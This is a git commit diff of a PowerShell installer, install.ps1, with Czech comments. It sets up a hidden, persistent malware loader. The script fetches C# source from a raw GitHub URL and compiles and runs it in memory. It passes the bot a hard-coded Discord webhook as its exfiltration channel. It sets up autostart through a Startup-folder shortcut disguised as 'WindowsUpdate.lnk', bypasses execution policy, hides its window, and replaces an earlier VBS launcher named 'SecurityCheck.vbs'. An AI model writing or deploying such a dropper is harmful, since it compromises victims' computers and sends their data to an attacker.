a1bae18d804b3687665af4ee6b4137c1142229b2
jfheifohfai <168677903+jfheifohfai@users.noreply.github.com>
2026-04-11 21:17:26 +0200

    Update install.ps1

--- install.ps1
+++ install.ps1
@@ -1,13 +1,21 @@
 $webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcUuG5GBIt6B9f55h99touvLjLOxvyLijuaTuZT15NO-xzYrJ78S2d2o"
 $github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
-$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"
+$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk"
 
-# Kód pro VBS, který spustí PowerShell neviditelně
-$vbsCode = @"
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell -WindowStyle Hidden -Command `$w='''$webhook'''; `$g='''$github'''; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies '''System.Management''','''System.Net.Http''','''System.Drawing''','''System.Windows.Forms''','''System.IO'''; [Program]::Main(`$w)", 0, False
-"@
+# Smazání zbytků starých verzí pro jistotu
+$oldVbs = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"
+if (Test-Path $oldVbs) { Remove-Item $oldVbs -Force }
 
-[System.IO.File]::WriteAllText($startupPath, $vbsCode)
+# Příkaz pro PowerShell (LNK verze)
+$arg = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"`$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`""
 
-wscript.exe $startupPath
+# Vytvoření čistého zástupce
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($lnkPath)
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Arguments = $arg
+$shortcut.WindowStyle = 7
+$shortcut.Save()
+
+# Spuštění procesu
+Start-Process powershell.exe -ArgumentList $arg -WindowStyle Hidden
